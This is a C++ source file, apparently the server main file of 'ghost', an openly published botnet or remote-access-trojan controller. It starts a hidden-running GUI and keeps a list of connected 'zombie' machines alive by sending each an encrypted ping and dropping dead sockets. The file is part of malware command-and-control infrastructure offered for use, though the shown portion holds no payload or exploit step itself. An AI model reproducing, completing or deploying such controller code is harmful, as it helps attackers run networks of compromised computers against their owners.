/*
	@title
		ghost
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2018

	ghost is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	ghost is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with ghost.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include				"config.h" // Macros and further configuration
#include				"ahxrwinsock.h" // https://github.com/AHXR/ahxrwinsocket
#include				"ghostlib.h" // Zombie storage (dll)
#include				"resource.h" // Resource Files
#include				"INIReader.h" // https://github.com/benhoyt/inih
#include				<wininet.h> // HTTP (real_ip)

using namespace			std;
using namespace			System;

DWORD WINAPI			t_window(LPVOID params);
void					refreshClients();

char *					c_ascii;
DWORD					d_console_id;
bool					b_hidden;
bool					b_gui_active;
bool					b_waiting;
bool					b_ping_wait;
unsigned short			us_exit;
unsigned short			us_warning;
HANDLE					h_gui;
AHXRSERVER				a_server;

#include				"info.h" // Client information and handling
#include				"gui.h" // Tray icon
#include				"encrypt.h" // Data encryption
#include				"callbacks.h" // Callbacks for ahxrwinsock 
#include				"console.h" // Console thread (ghost gui)

#pragma comment			(lib, "Wininet.lib") // real_ip library
#pragma comment			(lib, "user32.lib") // Windows functions

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pScmdline, int iCmdshow) 
{
	b_gui_active = true;
	h_gui = CreateThread(0, 0, t_gui, 0, 0, 0);
	CreateThread(0, 0, t_window, 0, 0, 0);

	while (b_gui_active) // This is to prevent this program from closing; but instead, run in the background.
		Sleep(1000);
    return 0;
}

DWORD WINAPI t_window(LPVOID params) {
	System::Windows::Forms::Application::EnableVisualStyles();
	System::Windows::Forms::Application::SetCompatibleTextRenderingDefault(false);
	server::gui frm;
	System::Windows::Forms::Application::Run(%frm);
	b_gui_active = false;
	return 0;
}

void refreshClients() {
	ghostlib::_clientData	client_data;
	int i_res;

	for (int i = 0; i < ghostlib::getZombieCount(); i++) {
		client_data = ghostlib::getZombieData(i);

		if (client_data.socketRef == INVALID_SOCKET) {
			ghostlib::deleteZombie(i);
			continue;
		}
		i_res = send(client_data.socketRef, encryptCMD(string("ghost_ping")).c_str(), 10, 0); // Testing if socket is active. Will never respond.

		if (i_res == SOCKET_ERROR)
			ghostlib::deleteZombie(i);

	}
}